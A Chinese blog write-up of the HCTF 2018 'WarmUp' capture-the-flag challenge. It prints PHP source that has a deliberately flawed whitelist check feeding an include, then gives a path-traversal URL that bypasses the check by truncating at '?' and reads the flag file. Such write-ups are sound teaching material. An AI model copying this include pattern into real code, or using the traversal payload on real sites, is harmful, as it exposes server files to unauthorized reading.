<!--yml
category: 未分类
date: 2022-04-26 14:30:07
-->

# [HCTF 2018]WarmUp 题解_偷一个月亮的博客-CSDN博客_hctf warmup

> 来源：[https://blog.csdn.net/yiqiushi4748/article/details/108348998](https://blog.csdn.net/yiqiushi4748/article/details/108348998)

## ****[HCTF 2018]WarmUp****

```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "
<img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> flag not here, and flag in ffffllllaaaagggg 
```

本地测试：

多加一个？使代码截取第一个？前面得内容

**http://127.0.0.1:8081/index.php?file=hint.php?/../../../../../../../../ffffllllaaaagggg**

**可以利用?截取hint.php，然后利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag**